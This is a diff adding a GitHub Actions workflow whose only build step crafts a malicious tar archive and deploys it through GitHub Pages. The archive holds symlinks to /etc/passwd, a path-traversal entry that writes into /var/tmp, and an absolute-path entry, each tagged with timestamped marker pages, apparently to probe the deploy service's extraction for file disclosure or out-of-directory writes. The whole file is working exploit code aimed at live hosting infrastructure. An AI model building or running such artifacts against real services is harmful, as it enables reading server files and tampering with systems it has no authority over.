@@ -1,0 +1,55 @@
+name: Crafted tar deploy
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+concurrency:
+  group: "pages"
+  cancel-in-progress: false
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - name: Craft tar with symlinks and traversal entries
+        run: |
+          python3 - <<'PY'
+          import tarfile, time, io
+          ts = int(time.time())
+          t = tarfile.open('artifact.tar', 'w', format=tarfile.GNU_FORMAT)
+          def addfile(name, data=b'', symlink=None):
+              ti = tarfile.TarInfo(name)
+              if symlink is not None:
+                  ti.type = tarfile.SYMTYPE
+                  ti.linkname = symlink
+                  ti.mode = 0o777
+                  t.addfile(ti)
+              else:
+                  ti.size = len(data)
+                  ti.mode = 0o644
+                  t.addfile(ti, io.BytesIO(data))
+          addfile('index.html', b'<!DOCTYPE html><html><body><h1>crafted tar deployed</h1></body></html>\n')
+          addfile('result-marker.html', ('<!DOCTYPE html><h1>MARKER-%d</h1>' % ts).encode())
+          addfile('sym_local.html', symlink='index.html')
+          addfile('sym_selfpath.html', symlink='./index.html')
+          addfile('sym_abs.html', symlink='/etc/passwd')
+          addfile('sym_rel.html', symlink='../../../../etc/passwd')
+          addfile('sym_rel2.html', symlink='../../../etc/passwd')
+          addfile('normal_sub/x.html', b'<!DOCTYPE html><h1>sub</h1>')
+          addfile('trav_dir/../../../../var/tmp/trav-marker-%d.html' % ts, ('<!DOCTYPE html><h1>TRAVERSAL-%d</h1>' % ts).encode())
+          addfile('/abs-marker-%d.html' % ts, ('<!DOCTYPE html><h1>ABS-%d</h1>' % ts).encode())
+          t.close()
+          open('ts.txt', 'w').write(str(ts))
+          PY
+          echo "TS=$(cat ts.txt)" >> "$GITHUB_ENV"
+          cat ts.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+      - uses: actions/deploy-pages@v4
+        id: deployment
